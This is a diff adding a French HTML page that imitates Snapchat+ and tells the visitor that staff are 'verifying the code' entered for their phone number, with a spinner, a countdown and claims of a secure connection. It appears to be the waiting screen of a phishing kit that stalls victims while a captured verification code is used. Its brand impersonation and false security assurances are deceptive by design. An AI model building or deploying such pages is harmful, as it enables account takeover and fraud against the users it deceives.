@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Vérification en cours — Snapchat+</title>
+    <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+    <div class="container">
+        <div class="main-card validation-card">
+            <div class="val-header">
+                <img src="https://cdn.imgbin.com/13/25/13/social-media-icon-snapchat-icon-6kBmyR3B.jpg" alt="Snapchat" class="val-logo" />
+                <h1>Vérification en cours</h1>
+                <p class="val-subtitle">Votre code est en cours de vérification par notre équipe</p>
+            </div>
+
+            <div class="val-status" id="valStatus">
+                <div class="spinner"></div>
+                <h2>Vérification du code...</h2>
+                <p class="val-phone">Code saisi pour le <strong id="displayPhone">--</strong></p>
+            </div>
+
+            <div class="val-alert">
+                <div class="alert-box">
+                    <span class="alert-icon">⏳</span>
+                    <div>
+                        <strong>VEUILLEZ PATIENTER</strong>
+                        <p>Un staff vérifie votre code, cela ne prend que quelques secondes</p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="val-network">
+                <div class="network-dots">
+                    <span></span><span></span><span></span>
+                </div>
+                <p>Connexion au serveur de vérification...</p>
+            </div>
+
+            <div class="val-timer">
+                <div class="timer-icon">🕒</div>
+                <div class="timer-text">
+                    <p>Temps d'attente estimé : <strong>~30 sec</strong></p>
+                    <p class="timer-small">Ne fermez pas cette page pendant la vérification</p>
+                </div>
+            </div>
+
+            <div class="val-footer">
+                <p>🔒 Connexion sécurisée • Données protégées</p>
+            </div>
+        </div>
+    </div>
+
+    <script src="verify-wait.js"></script>
+</body>
+</html>
